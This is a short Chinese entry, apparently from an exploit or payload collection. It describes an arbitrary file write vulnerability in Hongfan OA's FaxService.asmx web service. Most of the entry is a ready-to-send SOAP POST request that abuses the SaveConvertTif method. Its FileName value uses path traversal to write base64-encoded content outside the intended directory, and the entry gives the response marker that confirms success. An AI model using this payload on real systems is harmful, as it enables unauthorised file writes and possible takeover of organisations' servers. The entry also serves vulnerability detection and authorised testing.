# 红帆OAFaxService.asmx任意文件写入

红帆OAFaxService.asmx任意文件写入 ｜ 任意文件读取/写入 ｜ —
- **请求**：`POST /iOffice/prg/set/wss/FaxService.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<SaveConvertTif xmlns="http://tempuri.org/">
<FaxID>1</FaxID>
<Pages>2</Pages>
<FileName>../../../../dude.txt</FileName>
<FileContent>ZHVkZQ==</FileContent>
</SaveConvertTif>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：-1 SaveConvertTifResponse